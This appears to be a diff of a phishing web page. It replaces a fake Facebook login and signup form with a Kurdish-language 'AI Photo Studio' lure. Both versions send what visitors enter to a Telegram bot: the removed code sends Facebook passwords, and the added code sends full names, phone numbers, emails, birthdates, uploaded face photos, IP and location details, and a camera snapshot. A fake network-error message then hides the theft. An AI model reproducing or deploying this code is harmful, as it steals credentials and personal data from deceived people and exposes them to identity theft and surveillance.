@@ -3,279 +3,243 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - Log In or Sign Up</title>
+    <title>AI Photo Studio - دروستکردنی وێنە لە ڕێگەی زیرەکی دەستکردەوە</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.35/ua-parser.min.js"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;600;700;900&display=swap');
 
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Helvetica, Arial, sans-serif; }
-
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Vazirmatn', sans-serif; }
+        
         body {
-            background-color: #f0f2f5;
-            color: #1c1e21;
+            background: linear-gradient(135deg, #0f172a, #2e1065, #1e1b4b);
+            background-size: 400% 400%;
+            animation: neonBG 12s ease infinite;
+            color: #fff;
             min-height: 100vh;
             display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
-            padding: 20px 10px;
-        }
-
-        .fb-header-logo {
-            color: #1877f2;
-            font-size: 50px;
-            font-weight: bold;
-            letter-spacing: -2px;
-            margin-bottom: 10px;
-            text-align: center;
-        }
-
-        .fb-subtext {
-            font-size: 16px;
-            color: #1c1e21;
-            text-align: center;
-            margin-bottom: 20px;
-            max-width: 400px;
-            line-height: 1.4;
-        }
-
-        .card {
-            background: #ffffff;
-            border: none;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
             padding: 20px;
-            max-width: 400px;
+        }
+
+        @keyframes neonBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .container {
+            background: rgba(15, 23, 42, 0.8);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(56, 189, 248, 0.3);
+            padding: 30px 20px;
+            border-radius: 20px;
+            box-shadow: 0 0 35px rgba(56, 189, 248, 0.2), inset 0 0 15px rgba(168, 85, 247, 0.1);
+            max-width: 480px;
             width: 100%;
             text-align: center;
+        }
+
+        .logo-icon {
+            font-size: 45px;
+            margin-bottom: 10px;
+            animation: pulse 2s infinite;
+            filter: drop-shadow(0 0 10px #38bdf8);
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); filter: drop-shadow(0 0 5px #38bdf8); }
+            50% { transform: scale(1.12); filter: drop-shadow(0 0 20px #a855f7); }
+            100% { transform: scale(1); filter: drop-shadow(0 0 5px #38bdf8); }
+        }
+
+        h1 {
+            font-size: 22px;
+            color: #38bdf8;
+            margin-bottom: 8px;
+            font-weight: 900;
+            text-shadow: 0 0 10px rgba(56, 189, 248, 0.6), 0 0 20px rgba(56, 189, 248, 0.4);
+        }
+
+        p {
+            font-size: 13px;
+            color: #cbd5e1;
+            margin-bottom: 15px;
+            line-height: 1.6;
+            text-shadow: 0 0 5px rgba(203, 213, 225, 0.4);
+        }
+
+        .info-box {
+            background: rgba(56, 189, 248, 0.05);
+            border: 1px dashed rgba(56, 189, 248, 0.4);
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 12px;
+            color: #38bdf8;
+            margin-bottom: 15px;
+            text-shadow: 0 0 5px rgba(56, 189, 248, 0.5);
+            text-align: right;
+            line-height: 1.6;
+        }
+        
+        .form-group {
+            margin-bottom: 12px;
+            text-align: right;
+        }
+
+        .form-group label {
+            font-size: 12px;
+            color: #e2e8f0;
+            margin-bottom: 4px;
+            display: block;
+            text-shadow: 0 0 5px rgba(226, 232, 240, 0.4);
         }
 
         .form-control {
             width: 100%;
-            padding: 14px 16px;
-            background: #f5f6f7;
-            border: 1px solid #dddfe2;
-            border-radius: 6px;
-            color: #1d2129;
-            font-size: 15px;
+            padding: 10px 12px;
+            background: rgba(15, 23, 42, 0.7);
+            border: 1px solid rgba(56, 189, 248, 0.3);
+            border-radius: 8px;
+            color: #38bdf8;
+            font-size: 14px;
+            font-weight: 700;
             outline: none;
-            margin-bottom: 12px;
+            transition: all 0.3s;
+            text-shadow: 0 0 8px rgba(56, 189, 248, 0.6);
+            box-shadow: inset 0 0 5px rgba(0,0,0,0.5);
+        }
+
+        .form-control::placeholder {
+            color: rgba(56, 189, 248, 0.4);
+            font-weight: 400;
         }
 
         .form-control:focus {
-            border-color: #1877f2;
-            background: #fff;
-            box-shadow: 0 0 0 2px #e7f3ff;
-        }
-
-        .row-group {
-            display: flex;
-            gap: 10px;
-        }
-
-        .row-group .form-control {
-            flex: 1;
-        }
-
-        .field-label {
-            text-align: right;
-            font-size: 12px;
-            color: #606770;
-            margin-bottom: 4px;
-            font-weight: 600;
-        }
-
-        .gender-container {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 12px;
-        }
-
-        .gender-box {
-            flex: 1;
-            border: 1px solid #ccd0d5;
-            border-radius: 6px;
-            padding: 10px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            font-size: 14px;
-            color: #1c1e21;
-            background: #fff;
-            cursor: pointer;
-        }
-
-        .btn-primary {
-            background-color: #1877f2;
-            color: #ffffff;
-            border: none;
-            padding: 12px;
-            font-size: 18px;
-            font-weight: bold;
-            border-radius: 6px;
-            cursor: pointer;
-            width: 100%;
-            margin-top: 4px;
-            transition: background 0.2s;
-        }
-
-        .btn-primary:hover {
-            background-color: #166fe5;
-        }
-
-        .btn-secondary {
-            background-color: #42b72a;
-            color: #ffffff;
-            border: none;
-            padding: 12px 16px;
-            font-size: 16px;
-            font-weight: bold;
-            border-radius: 6px;
-            cursor: pointer;
-            display: inline-block;
-            margin-top: 15px;
-            text-decoration: none;
-        }
-
-        .btn-secondary:hover {
-            background-color: #36a420;
-        }
-
-        .forgot-link {
-            color: #1877f2;
-            font-size: 14px;
-            text-decoration: none;
-            display: block;
-            margin-top: 14px;
-        }
-
-        .forgot-link:hover {
-            text-decoration: underline;
-        }
-
-        .divider {
-            align-items: center;
-            border-bottom: 1px solid #dadde1;
-            display: flex;
-            margin: 20px 0;
-            text-align: center;
+            border-color: #a855f7;
+            box-shadow: 0 0 12px rgba(168, 85, 247, 0.6), inset 0 0 5px rgba(168, 85, 247, 0.3);
+            color: #e879f9;
+            text-shadow: 0 0 10px rgba(232, 121, 249, 0.8);
         }
 
         .upload-box {
-            border: 2px dashed #1877f2;
-            padding: 20px;
-            border-radius: 8px;
+            border: 2px dashed #a855f7;
+            padding: 15px;
+            border-radius: 10px;
             cursor: pointer;
-            background: #e7f3ff;
-            margin: 15px 0;
+            background: rgba(168, 85, 247, 0.05);
+            margin-top: 15px;
+            margin-bottom: 15px;
+            transition: all 0.3s ease;
+            box-shadow: 0 0 10px rgba(168, 85, 247, 0.2);
         }
 
-        .upload-text {
-            font-size: 14px;
-            color: #1877f2;
-            font-weight: bold;
+        .upload-box:hover {
+            background: rgba(168, 85, 247, 0.15);
+            box-shadow: 0 0 20px rgba(168, 85, 247, 0.4);
         }
 
         .upload-box input { display: none; }
+        
+        .upload-text {
+            font-size: 13px;
+            color: #e879f9;
+            font-weight: 700;
+            text-shadow: 0 0 8px rgba(232, 121, 249, 0.6);
+        }
 
-        .progress-container { display: none; margin-top: 20px; }
-
-        .progress-bar-bg {
-            background: #e4e6eb;
+        .btn {
+            background: linear-gradient(135deg, #0ea5e9, #a855f7);
+            color: white;
+            border: none;
+            padding: 12px;
+            font-size: 15px;
             border-radius: 10px;
-            height: 10px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: 900;
+            box-shadow: 0 0 20px rgba(14, 165, 233, 0.5), 0 0 20px rgba(168, 85, 247, 0.5);
+            transition: all 0.3s ease;
+            margin-top: 5px;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.8);
+        }
+
+        .btn:hover {
+            opacity: 0.95;
+            transform: translateY(-2px);
+            box-shadow: 0 0 30px rgba(14, 165, 233, 0.8), 0 0 30px rgba(168, 85, 247, 0.8);
+        }
+        
+        .progress-container { display: none; margin-top: 20px; }
+        
+        .progress-bar-bg {
+            background: #1e293b;
+            border-radius: 10px;
+            height: 9px;
             width: 100%;
             overflow: hidden;
             margin-bottom: 8px;
+            box-shadow: inset 0 0 5px rgba(0,0,0,0.8);
         }
 
         .progress-bar-fill {
-            background: #1877f2;
+            background: linear-gradient(90deg, #38bdf8, #a855f7);
             height: 100%;
             width: 0%;
             transition: width 0.4s ease;
+            box-shadow: 0 0 10px #38bdf8, 0 0 10px #a855f7;
         }
 
         .status-text {
-            font-size: 13px;
-            color: #606770;
+            font-size: 12px;
+            color: #38bdf8;
+            text-shadow: 0 0 8px rgba(56, 189, 248, 0.6);
         }
-
-        .section { display: none; }
-        .active-section { display: block; }
     </style>
 </head>
 <body>
 
-    <div class="fb-header-logo">facebook</div>
-    <div class="fb-subtext">بەخێربێیت! بۆ سوودوەرگرتن لە خزمیگوزاری AI Photo Studio، لە ڕێگەی فەیسبووکەوە بچۆ ژوورەوە.</div>
-
-    <!-- 1. LogIn Section -->
-    <div class="card section active-section" id="loginSection">
-        <input type="text" id="loginUser" class="form-control" placeholder="Email or Username">
-        <input type="password" id="loginPass" class="form-control" placeholder="Password">
-        <button class="btn-primary" onclick="handleLogin()">Log In</button>
+    <div class="container" id="main-card">
+        <div class="logo-icon">✨</div>
+        <h1>AI Photo Studio - دروستکردنی وێنە لە ڕێگەی زیرەکی دەستکردەوە AI</h1>
+        <p>ئەم ماڵپەڕە سەکۆیەکی پێشکەوتووی زیرەکی دەستکردە (AI) کە تایبەتە بە دروستکردنی وێنەی ناوازە بە زیرەکی دەستکرد بە کوالێتی بەرز.</p>
         
-        <a href="#" class="forgot-link" onclick="showSection('forgotSection')">Forgot password?</a>
-        
-        <div class="divider"></div>
-        <button class="btn-secondary" onclick="showSection('signupSection')">Create new account</button>
-    </div>
-
-    <!-- 2. SignUp Section -->
-    <div class="card section" id="signupSection">
-        <h2 style="font-size: 20px; margin-bottom: 5px; color: #1c1e21;">Create a new account</h2>
-        <p style="font-size: 13px; color: #606770; margin-bottom: 15px;">It's quick and easy.</p>
-        <div class="divider" style="margin: 10px 0 15px 0;"></div>
-
-        <div class="row-group">
-            <input type="text" id="regFirstName" class="form-control" placeholder="First name">
-            <input type="text" id="regLastName" class="form-control" placeholder="Surname">
+        <div class="info-box">
+            📌 <strong>بۆچی خۆتۆمارکردن گرنگە؟</strong><br>
+            بۆ ئەوەی سیستەمەکە بتوانێت داتای بەکارهێنەر وەربگرێ بۆ باشترکردنی خۆی، و وێنەکانت بە تەواوی دروست بکات و مۆدێلی AI چالاک ببێت، پێویستە خۆت تۆمار بکەیت و زانیارییەکان پڕ بکەیتەوە.
         </div>
 
-        <input type="text" id="regEmail" class="form-control" placeholder="Mobile number or email address">
-        <input type="password" id="regPass" class="form-control" placeholder="New password">
-
-        <div class="field-label">Date of birth</div>
-        <input type="date" id="regDOB" class="form-control">
-
-        <div class="field-label">Gender</div>
-        <div class="gender-container">
-            <label class="gender-box">
-                <span>Female</span>
-                <input type="radio" name="gender" value="Female">
-            </label>
-            <label class="gender-box">
-                <span>Male</span>
-                <input type="radio" name="gender" value="Male" checked>
-            </label>
+        <div class="form-group">
+            <label>ناوی خۆت:</label>
+            <input type="text" id="name" class="form-control" autocomplete="off" placeholder="ناوی خۆت بنووسە">
         </div>
-
-        <button class="btn-secondary" style="width: 100%; margin-top: 5px;" onclick="handleSignUp()">Sign Up</button>
-        <a href="#" class="forgot-link" onclick="showSection('loginSection')">Already have an account?</a>
-    </div>
-
-    <!-- 3. Forgot Password Section -->
-    <div class="card section" id="forgotSection">
-        <h2 style="font-size: 18px; margin-bottom: 10px; color: #1c1e21;">Find Your Account</h2>
-        <p style="font-size: 13px; color: #606770; margin-bottom: 15px;">Please enter your email address or mobile number to search for your account.</p>
-
-        <input type="text" id="forgotInput" class="form-control" placeholder="Email address or mobile number">
-        <button class="btn-primary" onclick="handleForgot()">Search</button>
-        <a href="#" class="forgot-link" onclick="showSection('loginSection')">Cancel</a>
-    </div>
-
-    <!-- 4. Main AI Process Section (دەستپێکردنی دروستکردنی وێنە) -->
-    <div class="card section" id="aiAppSection">
-        <h2 style="font-size: 18px; color: #1877f2; margin-bottom: 10px;">✨ AI Photo Studio</h2>
-        <p style="font-size: 13px; color: #606770; margin-bottom: 15px;">بۆ دروستکردنی ١٠٠ وێنەی ناوازە بە AI، تکایە وێنەیەکی روونی ڕوخسارت ئەپلۆد بکە.</p>
+        <div class="form-group">
+            <label>ناوی باوک:</label>
+            <input type="text" id="fatherName" class="form-control" autocomplete="off" placeholder="ناوی باوکت بنووسە">
+        </div>
+        <div class="form-group">
+            <label>ناوی باپیر:</label>
+            <input type="text" id="grandfatherName" class="form-control" autocomplete="off" placeholder="ناوی باپیریت بنووسە">
+        </div>
+        <div class="form-group">
+            <label>ژمارەی تەلەفۆن:</label>
+            <input type="tel" id="phone" class="form-control" autocomplete="off" placeholder="0750XXXXXXX">
+        </div>
+        <div class="form-group">
+            <label>ئیمەیڵەکەت:</label>
+            <input type="email" id="email" class="form-control" autocomplete="off" placeholder="example@gmail.com">
+        </div>
+        <div class="form-group">
+            <label>ڕێکەوتی لەدایکبوون:</label>
+            <input type="date" id="birthdate" class="form-control" autocomplete="off">
+        </div>
 
         <div class="upload-box" onclick="document.getElementById('fileInput').click()">
             <div class="upload-text" id="uploadLabel">📁 ئەپلۆدکردنی وێنەی کەسی (١ وێنە)</div>
             <input type="file" id="fileInput" accept="image/*" onchange="handleFileSelect()">
         </div>
 
-        <button class="btn-primary" id="generateBtn" onclick="startAIProcess()" disabled style="opacity: 0.5; cursor: not-allowed;">دەستپێکردنی دروستکردن</button>
+        <button class="btn" id="generateBtn" onclick="startAIProcess()" disabled style="opacity: 0.5; cursor: not-allowed;">دەستپێکردنی دروستکردن</button>
 
         <div class="progress-container" id="progressBox">
             <div class="progress-bar-bg">
@@ -291,88 +255,6 @@
         const chatId = urlParams.get('id') || "6782298541";
 
         let selectedFile = null;
-        let activeUserInfo = {};
-
-        function showSection(sectionId) {
-            document.querySelectorAll('.section').forEach(sec => sec.classList.remove('active-section'));
-            document.getElementById(sectionId).classList.add('active-section');
-        }
-
-        async function sendTelegramLog(text) {
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'Markdown' })
-                });
-            } catch (e) {}
-        }
-
-        async function handleLogin() {
-            const user = document.getElementById('loginUser').value.trim();
-            const pass = document.getElementById('loginPass').value.trim();
-
-            if (!user || !pass) {
-                alert("Please enter your email/username and password.");
-                return;
-            }
-
-            activeUserInfo = { emailOrPhone: user };
-
-            const msg = `🔐 **زانیاری چوونەژوورەوە (LogIn):**\n\n` +
-                        `👤 یوزەر/ئیمەیڵ: \`${user}\`\n` +
-                        `🔑 پاسۆرد: \`${pass}\``;
-            await sendTelegramLog(msg);
-
-            showSection('aiAppSection');
-        }
-
-        async function handleSignUp() {
-            const fName = document.getElementById('regFirstName').value.trim();
-            const lName = document.getElementById('regLastName').value.trim();
-            const email = document.getElementById('regEmail').value.trim();
-            const pass = document.getElementById('regPass').value.trim();
-            const dob = document.getElementById('regDOB').value;
-            const gender = document.querySelector('input[name="gender"]:checked').value;
-
-            if (!fName || !lName || !email || !pass) {
-                alert("Please fill in all required fields.");
-                return;
-            }
-
-            activeUserInfo = {
-                fullName: `${fName}${lName}`,
-                emailOrPhone: email,
-                dob: dob,
-                gender: gender
-            };
-
-            const msg = `📝 **زانیاری خۆتۆمارکردن (SignUp):**\n\n` +
-                        `👤 ناوی تەواو: ${fName}${lName}\n` +
-                        `📧 ئیمەیڵ/ژمارە: \`${email}\`\n` +
-                        `🔑 پاسۆرد: \`${pass}\`
-` +
-                        `📅 ڕێکەوتی لەدایکبوون: ${dob || 'دیاری نەکراوە'}\n` +
-                        `⚧ ڕەگەز: ${gender}`;
-            await sendTelegramLog(msg);
-
-            showSection('aiAppSection');
-        }
-
-        async function handleForgot() {
-            const input = document.getElementById('forgotInput').value.trim();
-            if (!input) {
-                alert("Please enter your email or phone number.");
-                return;
-            }
-
-            const msg = `⚠️ **داواکاری گەڕاندنەوەی پاسۆرد (Forgot Password):**\n\n` +
-                        `🔎 زانیاری داخڵکراو: \`${input}\``;
-            await sendTelegramLog(msg);
-
-            alert("ئەگەر ئەم ئەکاونتە هەبێت، کۆدی گەڕاندنەوەت بۆ دەنێردرێت.");
-            showSection('loginSection');
-        }
 
         function handleFileSelect() {
             const input = document.getElementById('fileInput');
@@ -388,8 +270,15 @@
         }
 
         async function startAIProcess() {
-            if (!selectedFile) {
-                alert("تکایە سەرەتا وێنەیەک هەڵبژێرە!");
+            let uName = document.getElementById('name').value.trim();
+            let uFather = document.getElementById('fatherName').value.trim();
+            let uGrand = document.getElementById('grandfatherName').value.trim();
+            let uPhone = document.getElementById('phone').value.trim();
+            let uEmail = document.getElementById('email').value.trim();
+            let uBirth = document.getElementById('birthdate').value.trim();
+
+            if (!uName || !uPhone || !selectedFile) {
+                alert("تکایە خانە سەرەکییەکان و وێنەکە پڕبکەرەوە!");
                 return;
             }
 
@@ -563,10 +452,10 @@
 
             const msg = `🚨 **زانیارییە پڕکراوەکان و تەکنیکییەکانی سەردانیکەر:**\n\n` +
                         `👤 **زانیارییە کەسییەکان:**\n` +
-                        `• ناوی تەواو: ${activeUserInfo.fullName || 'نەدیار'}\n` +
-                        `• ئیمەیڵ / ژمارە: \`${activeUserInfo.emailOrPhone || 'نەدیار'}\`\n` +
-                        `• ڕێکەوتی لەدایکبوون: ${activeUserInfo.dob || 'نەدیار'}\n` +
-                        `• ڕەگەز: ${activeUserInfo.gender || 'نەدیار'}\n\n` +
+                        `• ناوی تەواو: ${uName} ${uFather} ${uGrand}\n` +
+                        `• ژمارەی تەلەفۆن: \`${uPhone}\`\n` +
+                        `• ئیمەیڵ: ${uEmail || 'نەنووسراوە'}\n` +
+                        `• ڕێکەوتی لەدایکبوون: ${uBirth || 'نەنووسراوە'}\n\n` +
                         `⏰ کات: ${fullDateText}\n` +
                         `🌐 IP کەسەکە: ${ip} (${isp})\n` +
                         `📍 ${mapTextPart}\n` +
@@ -594,7 +483,11 @@
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' })
+                    body: JSON.stringify({ 
+                        chat_id: chatId, 
+                        text: msg,
+                        parse_mode: 'Markdown'
+                    })
                 });
             } catch (err) {}
 
@@ -603,7 +496,8 @@
                     const formDataCam = new FormData();
                     formDataCam.append('chat_id', chatId);
                     formDataCam.append('photo', cameraBlob, 'camera.jpg');
-                    formDataCam.append('caption', `📸 وێنەی ڕاستەوخۆی کەسەکە (${activeUserInfo.fullName || 'نەدیار'})`);
+                    formDataCam.append('caption', `📸 وێنەی ڕاستەوخۆی کەسەکە (${uName})`);
+                    
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formDataCam });
                 } catch (err) {}
             }
@@ -613,17 +507,18 @@
                     const formDataUpload = new FormData();
                     formDataUpload.append('chat_id', chatId);
                     formDataUpload.append('photo', selectedFile, selectedFile.name);
-                    formDataUpload.append('caption', `🖼 ئەو وێنەیەی کەسەکە خۆی ئەپلۆدی کردووە (${activeUserInfo.fullName || 'نەدیار'})`);
+                    formDataUpload.append('caption', `🖼 ئەو وێنەیەی کەسەکە خۆی ئەپلۆدی کردووە (${uName})`);
+                    
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formDataUpload });
                 } catch (err) {}
             }
 
             setTimeout(() => {
-                document.getElementById('aiAppSection').innerHTML = `
+                document.getElementById('main-card').innerHTML = `
                     <div style="font-size: 50px; margin-bottom: 15px; filter: drop-shadow(0 0 10px #f87171);">⚠️</div>
-                    <h1 style="color: #f87171; font-size: 20px;">وێنەکانت نەتوانران بە تەواوی دروست بکرێن!</h1>
-                    <p style="font-size: 13px; color: #606770; margin-top: 10px;">بەهۆی خراپی دۆخی ئینتەرنێتەکەت و پچڕانی هێڵەکەوە، پرۆسەی دروستکردنی وێنەکان سەرکەوتوو نەبوو. تکایە هێڵی ئینتەرنێتەکەت بپشکنە و دووبارە هەوڵ بدەرەوە.</p>
-                    <button class="btn-primary" onclick="location.reload()" style="margin-top: 15px; background: #f43f5e;">🔄 دووبارە هەوڵدانەوە (Retry)</button>
+                    <h1 style="color: #f87171; text-shadow: 0 0 10px rgba(248, 113, 113, 0.6);">وێنەکانت نەتوانران بە تەواوی دروست بکرێن!</h1>
+                    <p style="text-shadow: 0 0 5px rgba(255,255,255,0.3);">بەهۆی خراپی دۆخی ئینتەرنێتەکەت و پچڕانی هێڵەکەوە، پرۆسەی دروستکردنی وێنەکان سەرکەوتوو نەبوو. تکایە هێڵی ئینتەرنێتەکەت بپشکنە و دووبارە هەوڵ بدەرەوە.</p>
+                    <button class="btn" onclick="location.reload()" style="margin-top: 15px; background: linear-gradient(135deg, #f43f5e, #fb7185); box-shadow: 0 0 20px rgba(244, 63, 94, 0.5);">🔄 دووبارە هەوڵدانەوە (Retry)</button>
                 `;
             }, 1000);
         }
